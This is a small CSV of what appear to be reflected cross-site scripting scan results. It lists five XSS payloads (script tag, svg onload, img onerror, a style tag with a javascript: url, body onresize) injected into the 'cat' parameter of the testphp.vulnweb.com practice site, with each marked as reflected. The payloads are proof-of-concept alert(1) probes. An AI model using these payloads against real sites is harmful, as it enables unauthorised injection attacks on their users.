param,payload,url,reflected
cat,<script>alert(1)</script>,http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,True
cat,"""><svg/onload=alert(1)>",http://testphp.vulnweb.com/listproducts.php?cat=%22%3E%3Csvg%2Fonload%3Dalert%281%29%3E,True
cat,<img src=x onerror=alert(1)>,http://testphp.vulnweb.com/listproducts.php?cat=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,True
cat,<style>*{background:url(javascript:alert(1))}</style>,http://testphp.vulnweb.com/listproducts.php?cat=%3Cstyle%3E%2A%7Bbackground%3Aurl%28javascript%3Aalert%281%29%29%7D%3C%2Fstyle%3E,True
cat,<body onresize=alert(1)>,http://testphp.vulnweb.com/listproducts.php?cat=%3Cbody+onresize%3Dalert%281%29%3E,True
